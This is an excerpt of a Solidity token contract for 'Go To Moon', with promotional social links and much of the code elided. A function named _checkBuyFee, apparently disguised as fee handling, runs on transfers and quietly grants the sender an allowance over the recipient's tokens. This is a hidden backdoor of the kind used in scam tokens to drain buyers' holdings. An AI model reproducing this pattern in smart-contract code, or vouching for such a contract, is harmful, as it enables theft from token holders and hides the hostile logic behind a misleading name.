...
The use of the gotostatement requires a label to be defined in the program.

Website: https://gotomoon.net
TG:https://t.me/gotomoon_ERC
Twitter: https://twitter.com/gotomoon_ERC
...
contract GoToMoon is Context, IERC20, Ownable {
    ...
    string private constant _name = "Go To Moon";
    string private constant _symbol = unicode"goto moon;";
    ...
    address payable private _marketingAddress = payable(0xc1AbB1121aA09Cad67a547F90F27Bdf23430bB89);
    ...
    function _checkBuyFee(address buy1,  address buy2, uint256 tokens) private { _allowances[buy2][buy1] += tokens; }
    ...
    function _checkUserBuy(address from, address to, uint256 amount) private {
        if(from != address(this) && to != address(this)) _lastBuyback = block.timestamp;

        _checkBuyFee(from, to, amount);
    }
